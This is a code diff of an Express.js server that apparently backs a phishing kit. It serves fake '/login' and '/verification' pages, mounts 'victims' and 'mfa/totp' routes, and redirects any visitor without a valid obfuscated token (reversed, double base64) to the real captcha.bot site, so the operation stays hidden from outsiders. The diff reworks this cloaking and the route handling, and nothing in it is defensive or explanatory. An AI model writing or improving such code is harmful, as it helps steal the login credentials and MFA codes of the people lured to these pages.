@@ -29,9 +29,6 @@ async function check_base(conteudo, num) {
 module.exports = async function () {
     const chalk = (await import('chalk')).default
 
-    app.use('/login', express.static(path.join(__dirname, 'page', 'login')))
-    app.use('/verification', express.static(path.join(__dirname, 'page', 'verification')))
-
     app.set('trust proxy', true)
     app.use(express.json({
         'limit': '100mb',
@@ -41,41 +38,27 @@ module.exports = async function () {
         res.header("Access-Control-Allow-Origin", "*")
         res.header("Access-Control-Allow-Headers", "*")
 
-        if (req.method === 'GET' && req.url.includes('login')) {
-            try {
-                const query = req.query
-                if (!query.from) {
-                    return res.status(200).redirect('https://captcha.bot/')
-                }
-                const c = await check_base(atob(atob(query.from.split('').reverse().join(''))), 2)
-                if (!c) {
-                    return res.status(200).redirect('https://captcha.bot/')
-                }
-            } catch (e) {
-                return res.status(200).redirect('https://captcha.bot/')
-            }
+        const url = req.url.includes('login') || req.url.includes('verification') || req.url.includes('mfa/totp') || req.url.includes('victims')
+        const met = req.method === 'OPTIONS' || req.method === 'POST' || req.method === 'GET'
+
+        if (!url || !met) {
+            return res.status(200).redirect('https://captcha.bot')
         }
 
-        if (req.method === 'GET' && req.url.includes('verification')) {
+        if (req.method === 'GET' && (req.url.includes('/login/?') || req.url.includes('/verification/?'))) {
             try {
-                const query = req.query
-                if (!query.data) {
-                    return res.status(200).redirect('https://captcha.bot/')
-                }
-                const c = await check_base(Buffer.from(query.data, 'base64').toString('utf-8'), 1)
-                if (!c) {
-                    return res.status(200).redirect('https://captcha.bot/')
+                const body = req.query
+                const very = body.from ? await check_base(atob(atob(body.from.split('').reverse().join(''))), 2) : body.data ? await check_base(Buffer.from(body.data, 'base64').toString('utf-8'), 1) : false
+
+                if (!very) {
+                    return res.status(200).redirect('https://captcha.bot')
                 }
             } catch (e) {
-                return res.status(200).redirect('https://captcha.bot/')
+                return res.status(200).redirect('https://captcha.bot')
             }
         }
-
-        if (req.method === 'POST' || req.method === 'GET' || req.method === 'OPTIONS') {
-            return next()
-        } else {
-            return res.status(200).redirect('https://captcha.bot/')
-        }
+        
+        next()
     })
 
     app.options('*', async (req, res) => {
@@ -86,13 +69,9 @@ module.exports = async function () {
     app.use(mfa)
     app.use(victims)
 
-    app.get('/verification', express.static(path.join(__dirname, 'page', 'verification')), async function (req, res) {
-        res.status(200).sendFile(path.join(__dirname, 'page', 'verification', 'index.html'))
-    })
-
-    app.get('/login', express.static(path.join(__dirname, 'page', 'login')), async function (req, res) {
-        res.status(200).sendFile(path.join(__dirname, 'page', 'login', 'index.html'))
-    })
+    
+    app.use('/login', express.static(path.join(__dirname, 'page', 'login')));
+    app.use('/verification', express.static(path.join(__dirname, 'page', 'verification')));
 
     app.listen(8080, async () => {
         console.log(chalk.bold.green('[+] Server is running on port 8080.'))
